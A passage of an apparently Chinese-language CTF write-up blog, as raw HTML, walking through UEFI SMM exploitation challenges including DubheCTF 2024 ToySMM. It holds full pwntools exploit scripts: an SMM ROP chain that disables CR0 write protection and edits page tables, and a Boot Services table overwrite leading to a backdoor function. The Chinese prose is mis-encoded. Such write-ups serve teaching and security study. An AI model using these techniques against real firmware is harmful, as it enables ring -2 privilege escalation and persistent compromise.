class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">400</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Copy real ROP chain into buffer + 0x800 */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + real_chain]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer + <span class="number">0x800</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;real_chain_size&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* These two regs will spill on SMI stack */</span></span><br><span class="line"><span class="string">    mov r14, 0x7fe5269         /* pop rsp; ret */</span></span><br><span class="line"><span class="string">    mov r15, <span class="subst">&#123;buffer + <span class="number">0x800</span>&#125;</span>  /* -&gt; RSP */</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">real_chain:</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;real_chain&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX  - &#x27;</span>)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/12/14/uefi/23.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="DubheCTF-2024-ToySMM"><a href="#DubheCTF-2024-ToySMM" class="headerlink" title="DubheCTF 2024 ToySMM"></a>DubheCTF 2024 ToySMM</h3><p>æ­å–œä½ å·²ç»æˆåŠŸå…¥é—¨ UEFIï¼Œæ¥ä¸‹æ¥å°±æ¥çœ‹çœ‹ XCTF å§ğŸ¤£ğŸ¤£ğŸ¤£</p><h4 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>é¢˜ç›®æè¿°ï¼š  </p><blockquote><p>UEFI SMM<br>U know?<br>:)  </p></blockquote><p>è¿è¡Œæ•ˆæœï¼š  </p><img src="/2024/12/14/uefi/24.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>é¢˜ç›®çš„æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ToySMM/</span><br><span class="line">â”œâ”€â”€ OVMF_CODE.fd</span><br><span class="line">â”œâ”€â”€ OVMF_VARS.fd</span><br><span class="line">â”œâ”€â”€ flagregion</span><br><span class="line">â”œâ”€â”€ kvmvapic.bin</span><br><span class="line">â”œâ”€â”€ qemu-system-x86_64</span><br><span class="line">â”œâ”€â”€ readme.md</span><br><span class="line">â”œâ”€â”€ rootfs</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ToyApp.efi</span><br><span class="line">â”‚Â Â  â””â”€â”€ startup.nsh</span><br><span class="line">â””â”€â”€ run.sh</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ª readme.md æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š  </p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## Quick start</span></span><br><span class="line"></span><br><span class="line"><span class="code">`./run.sh`</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Files</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> flagregion</span><br><span class="line"></span><br><span class="line">â€‹       Real flag (Not very real :)</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> kvmvapic.bin</span><br><span class="line"></span><br><span class="line">â€‹       Used by qemu-system-x86<span class="emphasis">_64</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ qemu-system-x86_</span>64</span><br><span class="line"></span><br><span class="line">â€‹       Self build qemu with some patch to smm region (Hide real flag in 0x23330000)</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> run.sh</span><br><span class="line"></span><br><span class="line">â€‹       Start the virtual UEFI OVMF env.</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> OVMF<span class="emphasis">_CODE.fd OVMF_</span>VARS.fd</span><br><span class="line"></span><br><span class="line">â€‹       UEFI emulation env build with edk2</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> rootfs</span><br><span class="line"></span><br><span class="line">â€‹       Store a nsh file to auth start ToyApp.efi</span><br><span class="line"></span><br><span class="line"><span class="section">## Notice &amp;&amp; Tips</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Seld-build qemu-systyem-x86<span class="emphasis">_64 is built and tested on ubuntu</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ [<span class="string">UEFITools</span>](<span class="link">https://github.com/LongSoft/UEFITool</span>)  is a tool parse UEFI Firmware package</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ Only Ring -2 privileges can read the correct flag in 0x23330000</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦åˆ©ç”¨æ¼æ´æ¥è·å–åœ°å€ 0x23330000 ä¸Šçš„ flagï¼Œæ„Ÿè§‰è¦æ±‚å’Œä¸Šé¢ä¸¤é“é¢˜åŸºæœ¬ä¸€è‡´ã€‚<br>ç”±äºè¿™é“é¢˜æ²¡æœ‰ç»™å‡º patch æ–‡ä»¶ä¸”åªç»™äº†æ‰“åŒ…å¥½çš„å›ºä»¶ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ª ida æ’ä»¶ <a href="https://github.com/binarly-io/efiXplorer/releases">efiXplorer</a> æ¥å¸®æˆ‘ä»¬è§£åŒ…ã€‚å®‰è£…å¥½è¯¥æ’ä»¶åå°† OVMF_CODE.fd æ‹–è¿› ida åä¼šè‡ªåŠ¨è¿›è¡Œè§£åŒ…ã€‚é€šè¿‡ç›´è§‰ğŸ¤£ğŸ¤£ğŸ¤£æ‰¾åˆ°äº† ToySMM_handler å‡½æ•°ç„¶åæ‰‹åŠ¨æ¢å¤äº†ä¸€ä¸‹ç¬¦å·ï¼š  </p><img src="/2024/12/14/uefi/25.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¯¥å‡½æ•°ç¬¬ä¸€ä¸ª if è¯­å¥é‡Œé¢æ˜¯è°ƒç”¨ä¸€æ¬¡ BOOT_SERVICES-&gt;LocateProtocolï¼Œç¬¬äºŒä¸ª if è¯­å¥æ˜¯ä¸å¯èƒ½è¿›å»çš„ï¼Œè¿™è®©æˆ‘å¾ˆå¥½å¥‡ sub_363000 è¿™ä¸ªå‡½æ•°æ˜¯åœ¨å¹²ä»€ä¹ˆ :)  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_363000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_364052</span>(<span class="number">0x23330000</span>i64, <span class="number">32</span>i64);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_364052</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  __int64 i; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; a2 != i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v4 = __inbyte(<span class="number">0x3FD</span>u);</span><br><span class="line">    <span class="keyword">while</span> ( (v4 &amp; <span class="number">0x20</span>) == <span class="number">0</span> );</span><br><span class="line">    __outbyte(<span class="number">0x3F8</span>u, *(_BYTE *)(a1 + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°å°±ç±»ä¼¼äºç”¨äºæ‰“å° flag çš„åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è®©ç¨‹åºæ‰§è¡Œè¿™ä¸ªå‡½æ•°å³å¯ã€‚ç„¶åè¿™é‡Œè®©æˆ‘æ²¡æƒ³åˆ°çš„æ˜¯ï¼ŒBOOT_SERVICES è¿™ä¸ªå‡½æ•°è™šè¡¨æ˜¯å¯ä»¥æ”¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠ BOOT_SERVICES-&gt;LocateProtocol æ”¹æˆæ‰“å°åé—¨çš„å‡½æ•°å°±èƒ½ç›´æ¥è·å– flag äº†ï¼Œä¸è¿‡åœ¨è¿™ä¹‹å‰è¦æ»¡è¶³ç¬¬ä¸€ä¸ª if çš„æ¡ä»¶ã€‚ä¸è¿‡ç”±äº CommBuffer å’Œ CommBufferSize æ˜¯æˆ‘ä»¬è¿™äº›ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“æ»¡è¶³ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•æ‰¾åˆ°åé—¨å‡½æ•°çš„åœ°å€ï¼Œæˆ‘çš„åšæ³•æ˜¯ç›´æ¥åœ¨ gdb ä¸­æœç´¢ 0x23330000ï¼Œå› ä¸ºåœ¨è°ƒç”¨åé—¨å‡½æ•°å‰çš„ç¬¬äºŒä¸ª if è¯­å¥æœ‰å¯¹è¿™ä¸ªæ•°çš„ä½¿ç”¨  </p><img src="/2024/12/14/uefi/26.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶åç›´æ¥å’Œ ida é‡Œçš„æ±‡ç¼–è¿›è¡Œæ¯”è¾ƒï¼Œå°±èƒ½å¤Ÿæ‰¾åˆ°åé—¨å‡½æ•°çš„åœ°å€  </p><img src="/2024/12/14/uefi/27.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>æœ€ç»ˆ exp å¦‚ä¸‹ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BootServices&#125;</span></span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0x9d76f4b1548e0872ec86b7f3b31cf11e</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BootServices + <span class="number">320</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov qword ptr [rax], 0x5f9f080</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x40</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x28                             /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141               /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span 